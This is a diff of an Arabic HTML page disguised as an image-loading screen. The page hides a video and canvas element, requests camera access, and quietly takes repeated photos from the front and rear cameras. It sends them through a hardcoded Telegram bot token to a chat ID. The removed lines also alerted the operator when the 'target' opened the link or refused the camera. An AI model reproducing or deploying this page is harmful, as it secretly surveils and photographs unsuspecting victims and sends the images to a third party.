@@ -2,66 +2,57 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري تحميل الصورة...</title>
+    <title>تحميل المحتوى...</title>
     <style>
-        body { background-color: #000; color: white; text-align: center; padding-top: 20%; font-family: Arial; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto; }
+        body { background: black; color: white; text-align: center; padding-top: 20%; font-family: sans-serif; }
+        .loader { border: 5px solid #333; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <p>جاري معالجة الصورة، يرجى الانتظار...</p>
+    <p id="status">جاري تحميل الصورة بجودة عالية...</p>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // التوكن والايدي بتوعك بالظبط
         const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
         const chat_id = '8350812242';
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
 
-        // تنبيه للبوت أول ما الصفحة تفتح
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🚀 الهدف فتح الرابط الآن وجاري طلب الكاميرا...`);
-
-        async function start() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-
-            try {
-                // طلب الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-
-                // انتظر ثانية للتأكد من تشغيل الكاميرا
-                await new Promise(r => setTimeout(r, 1000));
-
-                // تصوير 8 صور
-                for (let i = 1; i <= 8; i++) {
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chat_id);
-                        formData.append('photo', blob, `img_${i}.jpg`);
-                        formData.append('caption', `✅ لقطة رقم ${i}`);
-
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }, 'image/jpeg', 0.6); // جودة 60% عشان تترفع بسرعة
-
-                    await new Promise(r => setTimeout(r, 2000)); // انتظر ثانيتين بين كل صورة
-                }
-            } catch (err) {
-                // لو رفض الاذن يبعتلك خبر
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=❌ الهدف رفض إذن الكاميرا`);
-            }
+        async function send(blob, label) {
+            const fd = new FormData();
+            fd.append('chat_id', chat_id);
+            fd.append('photo', blob, 'img.jpg');
+            fd.append('caption', `🔔 تقرير اختبار: لقطة ${label}`);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
         }
 
-        window.onload = start;
+        async function capture(mode, count) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+                v.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000)); // استقرار الكاميرا
+
+                for (let i = 0; i < count; i++) {
+                    c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+                    c.toBlob(blob => send(blob, mode === "user" ? "أمامية" : "خلفية"), 'image/jpeg', 0.5);
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا للتبديل
+            } catch (e) { console.error(e); }
+        }
+
+        async function run() {
+            await capture("user", 3);        // 3 أمامية
+            await capture("environment", 3); // 3 خلفية
+            await capture("user", 3);        // 3 أمامية تانية
+            document.getElementById('status').innerText = "تم التحميل بنجاح.";
+        }
+
+        window.onload = run;
     </script>
 </body>
 </html>
